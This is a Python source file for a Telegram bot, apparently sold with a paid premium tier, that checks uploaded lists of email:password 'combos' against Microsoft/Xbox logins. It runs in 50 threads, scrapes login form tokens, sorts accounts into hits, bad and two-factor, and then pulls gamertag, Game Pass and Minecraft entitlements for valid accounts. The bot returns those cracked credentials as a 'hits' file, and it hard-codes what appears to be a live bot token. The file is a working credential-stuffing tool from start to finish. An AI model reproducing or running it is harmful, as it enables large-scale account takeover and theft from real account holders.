# -*- coding: utf-8 -*-
"""
TELEGRAM TURBO XBOX CHECKER BOT - R1IVK CHECKER EXACT UI
"""

import os
import re
import time
import requests
import threading
import concurrent.futures
from urllib.parse import urlparse, parse_qs
import urllib3
from requests.adapters import HTTPAdapter
import telebot
from telebot import types

urllib3.disable_warnings()

# =================== CONFIGURATION ===================
BOT_TOKEN = "8896382526:AAEySaJWfg6pQpoRuSu8zQaG50uJ_Jf0obg"
OWNER_USERNAME = "@r1ivk"
bot = telebot.TeleBot(BOT_TOKEN)

# =================== GLOBALS ===================
active_scans = {}  
scan_lock = threading.Lock()
premium_users = []  # قائمة الـ IDs المشتركة بريميوم (30 يوم)

# =================== BYPASS & CORE LOGIC ===================
def extract_ppft(text):
    patterns = [
        r'name="PPFT"[^>]*value="([^"]+)"',
        r'value="([^"]+)"[^>]*name="PPFT"',
        r'"PPFT":"([^"]+)"',
        r'"sFTTag":"<input[^>]*value=\\"([^\\"]+)\\"',
        r'value=\\"([^\\"]+)\\"[^>]*name=\\"PPFT\\"',
        r'value=\"([^\"]+)\"[^>]*name=\"PPFT\"',
        r'name=\"PPFT\"[^>]*value=\"([^\"]+)\"',
        r'value="([^"]+)"[^>]*id="i0327"',
    ]
    for pattern in patterns:
        match = re.search(pattern, text, re.IGNORECASE)
        if match:
            token = match.group(1)
            token = token.replace('\\/', '/').replace('\\"', '"').replace('\\x26', '&')
            return token
    return None

def extract_url_post(text):
    patterns = [
        r'"urlPost":"([^"]+)"',
        r"urlPost:'([^']+)'",
        r'"urlPost":\s*"([^"]+)"',
        r'id="fmHF"\s+action="([^"]+)"',
        r'action="([^"]+)"[^>]*id="fmHF"',
    ]
    for pattern in patterns:
        match = re.search(pattern, text, re.IGNORECASE)
        if match:
            url = match.group(1)
            url = url.replace('\\/', '/')
            return url
    return None

def check_account_turbo(combo, user_state):
    if not user_state.get('is_running', True):
        return

    parts = combo.split(':')
    if len(parts) < 2:
        with user_state['lock']:
            user_state['bad'] += 1
            user_state['checked'] += 1
        return

    email = parts[0].strip()
    password = ':'.join(parts[1:]).strip()
    adapter = HTTPAdapter(pool_connections=100, pool_maxsize=100)

    for attempt in range(2):
        if not user_state.get('is_running', True):
            return

        session = requests.Session()
        session.verify = False
        session.mount('https://', adapter)
        session.mount('http://', adapter)
        session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
        })

        try:
            sftag_url = (
                "https://login.live.com/oauth20_authorize.srf"
                "?client_id=00000000402B5328"
                "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
                "&scope=service::user.auth.xboxlive.com::MBI_SSL"
                "&display=touch"
                "&response_type=token"
                "&locale=en"
            )
            resp = session.get(sftag_url, timeout=10)
            text = resp.text

            sftag = extract_ppft(text)
            url_post = extract_url_post(text)

            if not sftag or not url_post:
                with user_state['lock']:
                    user_state['errors'] += 1
                    user_state['checked'] += 1
                session.close()
                return

            login_data = {
                'login': email,
                'loginfmt': email,
                'passwd': password,
                'PPFT': sftag,
                'type': '11',
                'NewUser': '1',
                'LoginOptions': '3',
                'i19': '0',
            }
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Referer': sftag_url,
                'Origin': 'https://login.live.com',
            }
            login_req = session.post(url_post, data=login_data, headers=headers, allow_redirects=True, timeout=10)

            ms_token = None
            login_text = login_req.text.lower()

            if 'access_token' in login_req.url:
                ms_token = parse_qs(urlparse(login_req.url).fragment).get('access_token', [None])[0]
            elif 'access_token' in login_text:
                token_match = re.search(r'access_token=([^&\s\"\']+)', login_text)
                if token_match:
                    ms_token = token_match.group(1)
            elif any(x in login_text for x in ["password is incorrect", "account doesn't exist", "passwords don't match", "that password is incorrect", "account or password is incorrect"]):
                with user_state['lock']:
                    user_state['bad'] += 1
                    user_state['checked'] += 1
                session.close()
                return
            elif any(x in login_text for x in ["recover", "identity/confirm", "abuse", "locked", "help us protect", "verify your identity", "security challenge", "two-step"]):
                with user_state['lock']:
                    user_state['twofa'] += 1
                    user_state['checked'] += 1
                session.close()
                return
            elif 'cancel?mkt=' in login_text or 'kmsi' in login_text or 'stay signed in' in login_text:
                try:
                    ipt_match = re.search(r'"ipt" value="(.+?)"', login_req.text)
                    pprid_match = re.search(r'"pprid" value="(.+?)"', login_req.text)
                    uaid_match = re.search(r'"uaid" value="(.+?)"', login_req.text)
                    action_match = re.search(r'id="fmHF" action="(.+?)"', login_req.text) or re.search(r'action="([^"]+)"', login_req.text)

                    if ipt_match and pprid_match and uaid_match and action_match:
                        data2 = {
                            'ipt': ipt_match.group(1),
                            'pprid': pprid_match.group(1),
                            'uaid': uaid_match.group(1),
                            'LoginOptions': '3',
                            'type': '11',
                        }
                        ret = session.post(action_match.group(1), data=data2, allow_redirects=True, timeout=10)
                        if 'access_token' in ret.url:
                            ms_token = parse_qs(urlparse(ret.url).fragment).get('access_token', [None])[0]
                except:
                    pass

            if not ms_token:
                with user_state['lock']:
                    user_state['bad'] += 1
                    user_state['checked'] += 1
                session.close()
                return

            xb_payload = {"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": ms_token}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}
            xb_headers = {'Content-Type': 'application/json', 'Accept': 'application/json'}
            xb_req = session.post('https://user.auth.xboxlive.com/user/authenticate', json=xb_payload, headers=xb_headers, timeout=10)

            if xb_req.status_code != 200:
                raise Exception("Xbox Auth Error")

            xb_token = xb_req.json()['Token']
            uhs = xb_req.json()['DisplayClaims']['xui'][0]['uhs']

            gamertag, gamerscore = "N/A", "0"
            try:
                xsts_xb_payload = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]}, "RelyingParty": "http://xboxlive.com", "TokenType": "JWT"}
                xsts_xb_req = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_xb_payload, headers=xb_headers, timeout=10)
                if xsts_xb_req.status_code == 200:
                    xsts_xb_token = xsts_xb_req.json()['Token']
                    prof_req = session.get("https://profile.xboxlive.com/users/me/profile/settings?settings=Gamertag,Gamerscore", 
                                           headers={"Authorization": f"XBL3.0 x={uhs};{xsts_xb_token}", "x-xbl-contract-version": "2"}, timeout=10)
                    if prof_req.status_code == 200:
                        settings = prof_req.json().get('profileUsers', [{}])[0].get('settings', [])
                        for s in settings:
                            if s['id'] == 'Gamertag': gamertag = s['value']
                            if s['id'] == 'Gamerscore': gamerscore = s['value']
            except:
                pass

            has_gp, gp_type = False, "none"
            is_minecraft = "NO"
            games_list = []
            
            try:
                xsts_mc_payload = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]}, "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}
                xsts_mc_req = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_mc_payload, headers=xb_headers, timeout=10)
                if xsts_mc_req.status_code == 200:
                    xsts_mc_token = xsts_mc_req.json()['Token']
                    mc_auth = session.post('https://api.minecraftservices.com/authentication/login_with_xbox', 
                                           json={'identityToken': f"XBL3.0 x={uhs};{xsts_mc_token}"}, 
                                           headers={'Content-Type': 'application/json'}, timeout=10)
                    if mc_auth.status_code == 200:
                        mc_token = mc_auth.json().get('access_token')
                        if mc_token:
                            ent_req = session.get('https://api.minecraftservices.com/entitlements/mcstore', headers={'Authorization': f'Bearer {mc_token}'}, timeout=10)
                            if ent_req.status_code == 200:
                                mc_ent_text = ent_req.text
                                
                                if 'product_game_pass_ultimate' in mc_ent_text or 'product_game_pass_pc' in mc_ent_text:
                                    gp_type = "Ultimate/PC"
                                    has_gp = True
                                
                                if 'product_minecraft' in mc_ent_text or 'game_minecraft' in mc_ent_text:
                                    is_minecraft = "YES"
                                    games_list.append("Minecraft")
                                if 'product_dungeons' in mc_ent_text:
                                    games_list.append("Minecraft Dungeons")
                                if 'product_legends' in mc_ent_text:
                                    games_list.append("Minecraft Legends")
            except:
                pass

            hit_block = f"""{email}:{password}
Account: Gamerscore: {gamerscore}G | GamePass: {gp_type} | Minecraft: {is_minecraft}
Subscriptions:
Games List:"""
            
            if games_list:
                for idx, g in enumerate(games_list, 1):
                    hit_block += f"\n{idx} - {g} | Score: 0G"
            else:
                hit_block += "\nNo extra games found."
            
            hit_block += f"\n{'-'*40}\n"

            with user_state['lock']:
                user_state['hits_list'].append(hit_block)
                user_state['hits'] += 1
                user_state['checked'] += 1
            return

        except:
            pass
        finally:
            if session:
                session.close()

    with user_state['lock']:
        user_state['errors'] += 1
        user_state['checked'] += 1

# =================== TELEGRAM HANDLERS ===================
@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = types.InlineKeyboardMarkup()
    markup.row(types.InlineKeyboardButton("🔥 r1ivk Checker ⚡", callback_data="start_checker"))
    markup.row(types.InlineKeyboardButton("💎 Buy Premium (15$ / 30 Days)", url=f"https://t.me/{OWNER_USERNAME.replace('@','')}"))
    bot.send_message(message.chat.id, "Welcome to *r1ivk Checker ⚡*\nChoose your tool below:", parse_mode="Markdown", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "start_checker")
def callback_checker(call):
    bot.answer_callback_query(call.id)
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("❌ Cancel", callback_data="cancel_scan"))
    bot.send_message(call.message.chat.id, "🚀 *r1ivk Checker ⚡ Selected.*\n\nPlease send your combo file (`.txt`) in `email:password` format:\n\n📌 *Note:* Free version limit is **10,000 lines**. To unlock unlimited lines, contact owner {OWNER_USERNAME} to subscribe to Premium (15$ / 30 Days).".format(OWNER_USERNAME=OWNER_USERNAME), parse_mode="Markdown", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data in ["cancel_scan", "refresh_stats", "back_home"])
def handle_callbacks(call):
    chat_id = call.message.chat.id
    if call.data == "cancel_scan":
        if chat_id in active_scans:
            active_scans[chat_id]['is_running'] = False
        bot.answer_callback_query(call.id, "Scan stopped.")
        bot.edit_message_text("❌ *Scan manually stopped by user.*", chat_id=chat_id, message_id=call.message.message_id, parse_mode="Markdown")
    elif call.data == "refresh_stats":
        bot.answer_callback_query(call.id, "Stats refreshed!")
    elif call.data == "back_home":
        bot.answer_callback_query(call.id, "Main menu")
        bot.send_message(chat_id, "Use /start to open the checker panel.")

@bot.message_handler(content_types=['document'])
def handle_file(message):
    chat_id = message.chat.id
    if not message.document.file_name.endswith('.txt'):
        bot.send_message(chat_id, "⚠️ Please upload a valid .txt file!")
        return

    is_premium = chat_id in premium_users

    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        file_path = f"combo_{chat_id}.txt"
        with open(file_path, 'wb') as f:
            f.write(downloaded_file)

        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            combos = [line.strip() for line in f if ':' in line]

        if not combos:
            bot.send_message(chat_id, "⚠️ The file is empty or invalid format!")
            return

        unique_combos = list(dict.fromkeys(combos))

        # فحص حد الـ 10,000 سطر للنسخة العادية
        if not is_premium and len(unique_combos) > 10000:
            bot.send_message(chat_id, f"⚠️ *Limit Reached!*\nYour file has {len(unique_combos)} lines.\nFree version allows up to **10,000 lines** only.\n\nTo upgrade and remove limits, contact owner: {OWNER_USERNAME} (15$ / 30 Days)", parse_mode="Markdown")
            return

        markup = types.InlineKeyboardMarkup()
        markup.row(types.InlineKeyboardButton("🛑 Stop Scan", callback_data="cancel_scan"))
        markup.row(types.InlineKeyboardButton("🔄 Refresh", callback_data="refresh_stats"))
        markup.row(types.InlineKeyboardButton("🔙 Back", callback_data="back_home"))

        status_msg = bot.send_message(chat_id, "🔥 *LIVE SCAN STATS (Auto-refresh)*", parse_mode="Markdown", reply_markup=markup)

        user_state = {
            'chat_id': chat_id,
            'checked': 0,
            'total': len(unique_combos),
            'hits': 0,
            'bad': 0,
            'twofa': 0,
            'errors': 0,
            'hits_list': [],
            'is_running': True,
            'lock': threading.Lock(),
            'start_time': time.time()
        }
        active_scans[chat_id] = user_state

        threading.Thread(target=update_stats_loop, args=(chat_id, status_msg.message_id, user_state), daemon=True).start()
        threading.Thread(target=run_turbo_scan, args=(unique_combos, user_state, status_msg.message_id), daemon=True).start()

    except Exception as e:
        bot.send_message(chat_id, f"❌ Error processing file: {e}")

def update_stats_loop(chat_id, msg_id, state):
    while state['is_running'] and state['checked'] < state['total']:
        time.sleep(2)
        elapsed = time.time() - state['start_time']
        cpm = int((state['checked'] / elapsed) * 60) if elapsed > 1 else 0
        
        pct = (state['checked'] / state['total']) * 100
        filled = int(pct / 10)
        bar = "█" * filled + "░" * (10 - filled)

        text = f"""🔥 *LIVE SCAN STATS (Auto-refresh | {time.strftime('%H:%M:%S')})*

📊 *Total:*         {state['total']}
✓ *Checked:*   {state['checked']}
✗ *Bad:*          {state['bad']}
★ *Hits:*         {state['hits']}
🔒 *2FA:*         {state['twofa']}
⚠ *Errors:*      {state['errors']}

Progress: {pct:.1f}%
\\[{bar}\\]

⚡ *CPM:* {cpm}
⏱️ *Elapsed:* {time.strftime('%H:%M:%S', time.gmtime(elapsed))}

🎮 *Gaming Hits:*
• MC Hits: 0
• PSN Hits: 0
• Crunchyroll Hits: 0
• Rewards Hits: 0
• IMAP Hits: 0
• Bruter Hits: 0"""

        try:
            markup = types.InlineKeyboardMarkup()
            markup.row(types.InlineKeyboardButton("🛑 Stop Scan", callback_data="cancel_scan"))
            markup.row(types.InlineKeyboardButton("🔄 Refresh", callback_data="refresh_stats"))
            markup.row(types.InlineKeyboardButton("🔙 Back", callback_data="back_home"))
            bot.edit_message_text(text, chat_id=chat_id, message_id=msg_id, parse_mode="Markdown", reply_markup=markup)
        except:
            pass

def run_turbo_scan(combos, state, msg_id):
    threads = 50  
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(check_account_turbo, combo, state) for combo in combos]
        concurrent.futures.wait(futures)

    state['is_running'] = False
    elapsed = time.time() - state['start_time']
    
    final_text = f"""✅ *XBOX + MINECRAFT + GAMEPASS SCAN COMPLETED!*

📊 *Total:*        {state['total']}
★ *Hits:*        {state['hits']}
🔒 *2FA:*        {state['twofa']}
✗ *Bad:*         {state['bad']}

⏱️ *Time:* {time.strftime('%H:%M:%S', time.gmtime(elapsed))}"""

    try:
        bot.edit_message_text(final_text, chat_id=state['chat_id'], message_id=msg_id, parse_mode="Markdown")
    except:
        pass

    if state['hits'] > 0:
        result_file_path = f"r1ivk_checker_hits_{int(time.time())}.txt"
        try:
            with open(result_file_path, 'w', encoding='utf-8') as f:
                f.write("🔥 r1ivk Checker ⚡ Scan Results 🔥\n")
                f.write(f"📅 {time.strftime('%Y-%m-%d %H:%M:%S')} | 👑 Owner: {OWNER_USERNAME}\n")
                f.write("="*50 + "\n\n")
                f.writelines(state['hits_list'])
            
            with open(result_file_path, 'rb') as f:
                bot.send_document(state['chat_id'], f, caption=f"📁 *r1ivk Checker ⚡ Hits File* (Found: {state['hits']})", parse_mode="Markdown")
            
            os.remove(result_file_path)
        except Exception as e:
            bot.send_message(state['chat_id'], f"⚠️ Error sending file: {e}")
    else:
        bot.send_message(state['chat_id'], "⚠️ Scan finished, no hits found.")

if __name__ == "__main__":
    print("[+] r1ivk Checker ⚡ is running...")
    bot.infinity_polling()
